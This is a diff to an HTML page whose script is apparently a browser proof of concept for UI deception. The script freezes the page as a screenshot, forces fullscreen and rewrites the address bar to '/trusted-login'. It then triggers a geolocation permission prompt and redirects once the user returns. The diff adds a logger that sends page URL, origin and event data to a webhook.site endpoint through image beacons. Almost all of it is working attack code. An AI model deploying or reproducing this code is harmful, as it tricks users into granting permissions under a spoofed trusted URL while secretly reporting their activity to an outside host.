@@ -28,17 +28,39 @@ button {
 
 <body>
 
-<button id="start">Start Demooo</button>
+<button id="start">Start Demo</button>
 
 <script>
 const TARGET = "https://google.com";
+const LOG_ENDPOINT = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
+
 let triggered = false;
 
-// freeze UI
+// ===== LOGGER =====
+function logEvent(type, extra = {}) {
+  const data = {
+    type,
+    ts: performance.now().toFixed(3),
+    epoch: Date.now(),
+    url: location.href,
+    origin: location.origin,
+    visibility: document.visibilityState,
+    readyState: document.readyState,
+    ...extra
+  };
+
+  const params = new URLSearchParams(data).toString();
+
+  // penting: pakai backticks
+  new Image().src = `${LOG_ENDPOINT}?${params}`;
+}
+
+// ===== FREEZE UI =====
 function freezeUI() {
   return html2canvas(document.body,{scale:2}).then(canvas=>{
     const img = document.createElement("img");
     img.src = canvas.toDataURL();
+
     Object.assign(img.style,{
       position:"fixed",
       top:"0",
@@ -47,27 +69,38 @@ function freezeUI() {
       height:"100vh",
       zIndex:"999999"
     });
+
     document.body.innerHTML="";
     document.body.appendChild(img);
+
+    logEvent("ui_frozen");
   });
 }
 
-// trigger permission
+// ===== GEO =====
 function requestGeo() {
-  navigator.geolocation.getCurrentPosition(()=>{},()=>{});
+  logEvent("geolocation_requested");
+
+  navigator.geolocation.getCurrentPosition(
+    () => logEvent("geolocation_success"),
+    (err) => logEvent("geolocation_error", {code: err.code})
+  );
 }
 
-// 🔥 redirect dengan delay 5 detik
+// ===== REDIRECT DELAY =====
 function delayedRedirect() {
   if (triggered) return;
   triggered = true;
 
+  logEvent("returned_from_settings");
+
   setTimeout(() => {
+    logEvent("redirecting", {target: TARGET});
     location.replace(TARGET);
-  }, 5000); // 5 detik
+  }, 5000);
 }
 
-// detect balik dari settings
+// ===== EVENTS =====
 document.addEventListener("visibilitychange", () => {
   if (document.visibilityState === "visible") {
     delayedRedirect();
@@ -77,14 +110,17 @@ document.addEventListener("visibilitychange", () => {
 window.addEventListener("focus", delayedRedirect);
 window.addEventListener("pageshow", delayedRedirect);
 
-// start
+// ===== START =====
 document.getElementById("start").onclick = () => {
+
+  logEvent("poc_started");
 
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen();
   }
 
   history.replaceState({}, '', '/trusted-login');
+  logEvent("url_spoofed");
 
   freezeUI().then(()=>{
     setTimeout(requestGeo, 100);
